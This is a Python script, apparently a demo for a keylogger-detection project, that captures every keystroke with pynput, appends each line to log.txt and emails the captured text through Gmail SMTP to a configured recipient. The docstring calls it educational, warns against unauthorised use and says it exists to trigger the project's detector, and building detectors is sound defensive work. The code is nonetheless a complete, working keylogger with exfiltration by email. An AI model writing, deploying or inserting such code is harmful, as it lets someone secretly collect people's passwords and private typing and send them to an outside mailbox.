"""
Demo keylogger — for educational and testing purposes only.

This script is included so you can trigger the detector during development.
DO NOT use this against systems you do not own or have explicit permission to test.

Setup:
  1. Copy .env.example to .env and fill in your credentials.
  2. pip install pynput python-dotenv
  3. python keylogger.py

The detector should alert within a few seconds of the script sending an email.
"""
import os
import smtplib

from dotenv import load_dotenv
from pynput import keyboard

load_dotenv()

SMTP_USER = os.environ.get("KEYLOGGER_EMAIL")
SMTP_PASS = os.environ.get("KEYLOGGER_PASSWORD")
RECIPIENT  = os.environ.get("KEYLOGGER_RECIPIENT")

if not all([SMTP_USER, SMTP_PASS, RECIPIENT]):
    raise SystemExit(
        "Missing environment variables.\n"
        "Copy .env.example to .env and fill in KEYLOGGER_EMAIL, "
        "KEYLOGGER_PASSWORD, and KEYLOGGER_RECIPIENT."
    )

log_file = open("log.txt", "a")
captured = ""


def send_email(text):
    print(f"[keylogger] Sending captured text to {RECIPIENT}...")
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(SMTP_USER, SMTP_PASS)
            server.sendmail(SMTP_USER, RECIPIENT, text)
    except Exception as exc:
        print(f"[keylogger] Email failed: {exc}")


def on_press(key):
    global captured

    if key == keyboard.Key.esc:
        log_file.close()
        return False  # stop listener

    if key == keyboard.Key.backspace:
        captured = captured[:-1]
        return

    if key == keyboard.Key.space:
        captured += " "
        return

    if key == keyboard.Key.enter:
        send_email(captured)
        log_file.write(captured + "\n")
        log_file.flush()
        captured = ""
        return

    captured += str(key)[1:2]


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
